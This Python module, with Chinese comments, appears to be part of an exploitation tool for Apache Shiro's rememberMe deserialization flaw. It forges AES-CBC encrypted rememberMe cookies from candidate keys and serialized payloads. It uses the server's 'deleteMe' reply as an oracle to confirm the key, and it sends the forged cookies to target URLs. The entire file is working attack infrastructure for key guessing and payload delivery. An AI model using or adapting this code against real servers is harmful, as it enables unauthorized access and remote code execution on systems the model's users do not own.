#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RememberMe Cookie 的构造、解析与发送。

Shiro 的真实格式（1.2.4 ~ 1.4.x，CBC 模式）::

    Cookie: rememberMe = base64( IV[16] || AES-128-CBC(PKCS#7(序列化字节), key, IV) )

关键点：
    1. **IV 必须放在密文最前面**。Shiro 的 ``JcaCipherService.decrypt`` 会把
       传入字节的前 16 字节当作 IV；只发密文会让明文整体错位、解密失败；
    2. 不要对 Cookie 值做 URL 编码。``quote()`` 会把 ``+``、``=`` 变成
       ``%2B``、``%3D``，base64 解码直接失败；
    3. 解密失败 / 反序列化失败时 Shiro 都会回写 ``rememberMe=deleteMe``，
       所以“没有 deleteMe”才是有意义的信号 —— 但前提是先验证目标确实会回
       deleteMe（本模块的 ``baseline_probe`` 负责这件事）。
"""

from __future__ import annotations

import base64
import os
import random
from dataclasses import dataclass

from . import aes
from .httpc import HttpClient, Response

COOKIE_NAME = "rememberMe"


# --------------------------------------------------------------------------- #
# 构造 / 解析
# --------------------------------------------------------------------------- #


def build_cookie_bytes(key_b64: str, payload: bytes, iv: bytes | None = None) -> bytes:
    key = aes.b64decode_key(key_b64)
    return aes.shiro_encrypt(key, payload, iv)


def build_cookie(key_b64: str, payload: bytes, iv: bytes | None = None) -> str:
    return base64.b64encode(build_cookie_bytes(key_b64, payload, iv)).decode("ascii")


def build_cookie_with_key(key: bytes, payload: bytes, iv: bytes | None = None) -> str:
    return base64.b64encode(aes.shiro_encrypt(key, payload, iv)).decode("ascii")


def parse_cookie(cookie_b64: str) -> tuple[bytes, bytes]:
    """拆出 (IV, 密文)；格式不对会抛 ValueError。"""
    raw = base64.b64decode(cookie_b64, validate=False)
    if len(raw) <= 16 or (len(raw) - 16) % 16:
        raise ValueError(f"Cookie 长度非法: {len(raw)} 字节")
    return raw[:16], raw[16:]


def random_iv() -> bytes:
    return os.urandom(16)


def junk_cookie() -> str:
    """32 字节随机串（16 IV + 16 密文），用于探测 deleteMe 行为。"""
    return base64.b64encode(random.randbytes(32)).decode("ascii")


# --------------------------------------------------------------------------- #
# 响应判定
# --------------------------------------------------------------------------- #


def rememberme_values(resp: Response) -> list[str]:
    return [v for k, v in resp.cookie_pairs() if k.lower() == COOKIE_NAME.lower()]


def is_delete_me(resp: Response) -> bool:
    """Shiro 在密钥错误/反序列化失败时会回写 ``rememberMe=deleteMe``。"""
    for value in rememberme_values(resp):
        if value.strip().lower() in ("deleteme", "deleted"):
            return True
    # 少数应用把 Cookie 放到响应体里（比如调试页面）
    body = resp.text.lower()
    return "rememberme=deleteme" in body or "rememberme=deleted" in body


def looks_logged_in(resp: Response) -> bool:
    """粗判：响应是不是正常业务页面，而不是登录页/错误页。"""
    if resp.error or resp.status >= 400:
        return False
    body = resp.text.lower()
    login_words = ("登录", "login", "signin", "sign in", "密码", "password", "验证码")
    hits = sum(1 for w in login_words if w in body)
    return hits < 2 and len(resp.body) > 200


@dataclass
class Baseline:
    """目标的 deleteMe 基线行为。"""

    ok: bool
    resp: Response
    delete_me: bool
    reason: str = ""

    def describe(self) -> str:
        if self.resp.error:
            return f"基线请求失败: {self.resp.error}"
        if self.delete_me:
            return "目标对无效 rememberMe 回写 deleteMe（可用作密钥判定 oracle）"
        return ("目标未回写 deleteMe：无法用 deleteMe 判定密钥（可能未启用 rememberMe、"
                "被 WAF 改写，或只在特定路径处理）")


def baseline_probe(client: HttpClient, url: str) -> Baseline:
    resp = client.get(url, headers={"Cookie": f"{COOKIE_NAME}={junk_cookie()}"})
    delete_me = is_delete_me(resp)
    reason = "" if delete_me else "未观察到 rememberMe=deleteMe"
    return Baseline(ok=delete_me, resp=resp, delete_me=delete_me, reason=reason)


# --------------------------------------------------------------------------- #
# 发送
# --------------------------------------------------------------------------- #


def send_cookie(client: HttpClient, url: str, cookie: str,
                extra_headers: dict[str, str] | None = None) -> Response:
    headers = {"Cookie": f"{COOKIE_NAME}={cookie}"}
    if extra_headers:
        headers.update(extra_headers)
    return client.get(url, headers=headers)


def send_raw_cookie(client: HttpClient, url: str, cookie_value: str,
                    extra_headers: dict[str, str] | None = None) -> Response:
    return send_cookie(client, url, cookie_value, extra_headers)


def describe_cookie(cookie_b64: str) -> str:
    raw = base64.b64decode(cookie_b64, validate=False)
    return (f"{len(cookie_b64)} 字符 / {len(raw)} 字节 "
            f"(IV {raw[:16].hex()[:8]}… + {len(raw) - 16} 字节密文)")
